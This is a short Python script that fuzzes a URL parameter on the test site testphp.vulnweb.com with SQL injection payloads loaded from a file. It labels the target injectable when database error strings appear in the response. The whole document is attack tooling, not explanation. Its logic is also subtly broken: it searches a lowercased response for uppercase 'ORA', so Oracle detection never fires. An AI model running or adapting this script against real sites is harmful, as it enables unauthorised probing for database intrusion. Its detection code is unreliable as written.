import requests

url = "http://testphp.vulnweb.com/listproducts.php?cat="

sql_payloads = []

with open('sql-attack-vector.txt', 'r') as filehandle:
    for line in filehandle:
        sql_payload = line[:-1]
        sql_payloads.append(sql_payload)

for payload in sql_payloads:
    print ("Testing "+ url + payload)
    response = requests.post(url+payload)
    
    if "mysql" in response.text.lower(): 
        print("Injectable MySQL detected,attack string: "+payload)
    elif "native client" in response.text.lower():
        print("Injectable MSSQL detected,attack string: "+payload)
    elif "syntax error" in response.text.lower():
        print("Injectable PostGRES detected,attack string: "+payload)
    elif "ORA" in response.text.lower():
        print("Injectable Oracle database detected,attack string: "+payload)
    else:
        print("Payload ",payload," not injectable")
